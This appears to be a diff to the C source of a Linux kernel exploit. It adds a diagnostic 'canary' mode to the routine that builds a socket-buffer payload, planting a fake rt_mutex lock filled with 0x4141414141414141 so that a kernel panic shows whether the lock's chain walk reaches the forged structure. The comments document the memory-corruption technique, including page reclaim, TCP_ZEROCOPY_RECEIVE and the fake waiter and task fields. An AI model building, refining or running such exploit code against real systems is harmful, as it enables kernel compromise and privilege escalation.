@@ -488,6 +488,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
   int payload_delta = SKB_DATA_DELTA;
+  int fops_lock_canary =
+      payload_mode == PAGE_PAYLOAD_FOPS && env_flag("FOPS_LOCK_CANARY", 0);
   int main_tcp_payload =
       payload_mode == PAGE_PAYLOAD_FOPS &&
       env_flag("MAIN_TCP_PAYLOAD", MAIN_TCP_PAYLOAD_DEFAULT);
@@ -556,6 +558,27 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x08, 0);
       put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, 0);
+    } else if (fops_lock_canary) {
+      // FOPS_LOCK_CANARY answers the one question the write probe left open:
+      // does the chain walk reach the fake lock at all in FOPS mode?
+      //
+      // It cannot be answered by watching for a write, because the FOPS route
+      // has no way to plant a write payload in the stack waiter — the
+      // TCP_ZEROCOPY_RECEIVE struct only reaches the waiter's task and lock
+      // fields, so the write has to come from the page-resident structures
+      // further along the walk. Nor by watching for a crash: on a page the
+      // reclaim lost, the walk reads a foreign rb_leftmost and panics, which
+      // is exactly what the slide route does — yet FOPS has never panicked in
+      // over a hundred failures, which already hints the walk never arrives.
+      //
+      // So make arrival unmistakable. rt_mutex_top_waiter() loads
+      // lock->waiters.rb_leftmost and then dereferences it at +0x38, so a
+      // recognisable non-canonical value here turns "the walk reached this
+      // lock" into a panic whose faulting address says so outright:
+      // 0x4141414141414141 + 0x38. No panic means the walk never got here.
+      put64(p, LOCK_OFF + 0x08, 0x4141414141414141ULL);
+      put64(p, LOCK_OFF + 0x10, 0x4141414141414141ULL);
+      put64(p, LOCK_OFF + 0x18, fake_task | 1);
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
